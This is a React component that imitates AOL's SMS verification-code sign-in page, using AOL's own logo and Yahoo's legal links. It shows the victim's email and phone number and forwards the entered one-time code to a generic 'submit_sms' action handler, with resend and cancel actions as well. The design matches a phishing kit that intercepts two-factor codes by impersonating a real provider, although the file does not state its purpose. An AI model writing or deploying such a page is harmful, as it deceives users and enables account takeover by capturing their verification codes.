import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface AolSmsCodePageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const AolLogo = ({ className = '' }: { className?: string }) => (
  <img
    src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png"
    alt="AOL"
    className={`select-none ${className}`}
  />
);

const AolSmsCodePage: React.FC<AolSmsCodePageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const phoneNumber = (data.phoneNumber as string) || (data.phone as string) || 'your recovery phone';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [isFocused, setIsFocused] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_sms', { code });
  };

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[400px] px-6 py-10">
          <div className="mb-8 flex justify-center">
            <AolLogo className="h-10" />
          </div>
          <h1 className="text-[22px] leading-7 font-normal text-black mb-2">Verification code</h1>
          <p className="text-sm text-gray-700 mb-6">
            We sent a verification code to <strong>{phoneNumber}</strong>. Please enter it below to continue signing in.
          </p>
          {email && (
            <div className="text-xs text-gray-500 mb-4">Signed in as {email}</div>
          )}
          <form onSubmit={handleSubmit}>
            <div className="relative mt-4">
              <input
                type="tel"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                placeholder="Enter code"
                maxLength={8}
                autoFocus
                className="w-full bg-white pt-2 pb-2 text-base border-b tracking-[0.25em] focus:outline-none"
                style={{
                  borderColor: isFocused ? '#0073e6' : '#dcdfe0',
                  transition: 'border-color 0.2s',
                }}
              />
            </div>

            <button
              type="submit"
              disabled={code.length < 6 || submitting}
              className="w-full mt-8 py-3 text-white text-base font-medium rounded-full disabled:opacity-60 disabled:cursor-not-allowed"
              style={{ backgroundColor: '#0073e6' }}
            >
              {submitting ? 'Verifying\u2026' : 'Verify'}
            </button>
          </form>

          <div className="mt-6 flex justify-between text-sm">
            <button
              type="button"
              onClick={() => onAction('resend_sms')}
              className="hover:underline"
              style={{ color: '#0073e6' }}
            >
              Resend code
            </button>
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="hover:underline"
              style={{ color: '#0073e6' }}
            >
              Try another way
            </button>
          </div>
        </div>
      </main>
      <footer className="w-full max-w-[400px] mx-auto text-xs text-gray-500 text-center py-6">
        AOL &middot; <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.htm" className="hover:underline">Privacy</a> &middot; <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.htm" className="hover:underline">Terms</a>
      </footer>
    </div>
  );
};

export default AolSmsCodePage;
